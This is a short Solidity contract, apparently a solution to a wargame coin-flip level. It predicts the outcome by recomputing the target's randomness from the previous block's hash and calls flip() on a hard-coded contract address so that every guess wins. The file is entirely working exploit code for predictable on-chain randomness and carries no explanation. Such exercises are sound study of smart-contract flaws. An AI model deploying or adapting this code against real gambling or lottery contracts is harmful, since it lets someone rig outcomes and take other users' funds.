// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface CoinFlipInterface {
  function flip(bool _guess) external returns (bool);
  function consecutiveWins() external view returns (uint256);
}

contract GuessCoinFlip {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address cnAddress = 0x3771D361CcF495219E112D4AAc841F1398F4b571;
  CoinFlipInterface CoinFlip = CoinFlipInterface(cnAddress);

  event isWin(bool result);

  function guessCoinFlip() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
      
    bool guessResult = CoinFlip.flip(side);
    emit isWin(guessResult);
  }

  function getConsecutiveWins() public view returns (uint256) {
    return CoinFlip.consecutiveWins();
  }
}
